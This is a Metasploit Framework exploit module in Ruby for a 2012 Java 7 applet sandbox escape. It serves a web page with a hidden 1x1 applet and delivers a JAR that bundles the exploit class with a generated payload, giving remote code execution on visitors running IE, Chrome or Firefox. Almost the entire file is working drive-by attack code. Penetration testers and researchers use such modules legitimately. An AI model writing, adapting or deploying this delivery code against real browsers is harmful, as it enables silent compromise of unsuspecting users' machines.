##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
require 'rex'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({ :javascript => false })
 
    def initialize( info = {} )
        super( update_info( info,
            'Name'          => 'Java 7 Applet Remote Code Execution',
            'Description'   => %q{
                    This module exploits a vulnerability in Java 7, which allows an attacker to run arbitrary
                Java code outside the sandbox. This flaw is also being exploited in the wild, and there is
                no patch from Oracle at this point. The exploit has been tested to work against: IE, Chrome
                and Firefox across different platforms.
            },
            'License'       => MSF_LICENSE,
            'Author'        =>
                [
                    'Unknown', # Vulnerability Discovery
                    'jduck', # metasploit module
                    'sinn3r', # metasploit module
                    'juan vazquez', # metasploit module
                ],
            'References'    =>
                [
                    #[ 'CVE', '' ],
                    #[ 'OSVDB', '' ],
                    [ 'URL', 'http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html' ],
                    [ 'URL', 'http://www.deependresearch.org/2012/08/java-7-0-day-vulnerability-information.html' ]
                ],
            'Platform'      => [ 'java', 'win', 'linux' ],
            'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
            'Targets'       =>
                [
                    [ 'Generic (Java Payload)',
                        {
                            'Arch' => ARCH_JAVA,
                        }
                    ],
                    [ 'Windows Universal',
                        {
                            'Arch' => ARCH_X86,
                            'Platform' => 'win'
                        }
                    ],
                    [ 'Linux x86',
                        {
                            'Arch' => ARCH_X86,
                            'Platform' => 'linux'
                        }
                    ]
                ],
            'DefaultTarget'  => 0,
            'DisclosureDate' => 'Aug 26 2012'
            ))
    end
 
 
    def on_request_uri( cli, request )
        if not request.uri.match(/\.jar$/i)
            if not request.uri.match(/\/$/)
                send_redirect(cli, get_resource() + '/', '')
                return
            end
 
            print_status("#{self.name} handling request")
 
            send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )
            return
        end
 
        paths = [
            [ "Exploit.class" ]
        ]
 
        p = regenerate_payload(cli)
 
        jar  = p.encoded_jar
        paths.each do |path|
            1.upto(path.length - 1) do |idx|
                full = path[0,idx].join("/") + "/"
                if !(jar.entries.map{|e|e.name}.include?(full))
                    jar.add_file(full, '')
                end
            end
            fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-XXXX", path ), "rb")
            data = fd.read(fd.stat.size)
            jar.add_file(path.join("/"), data)
            fd.close
        end
 
        print_status("Sending Applet.jar")
        send_response( cli, jar.pack, { 'Content-Type' => "application/octet-stream" } )
 
        handler( cli )
    end
 
    def generate_html
        html  = "<html><head></head>"
        html += "<body>"
        html += "<applet archive=\"Exploit.jar\" code=\"Exploit.class\" width=\"1\" height=\"1\">"
        html += "</applet></body></html>"
        return html
    end
 
end
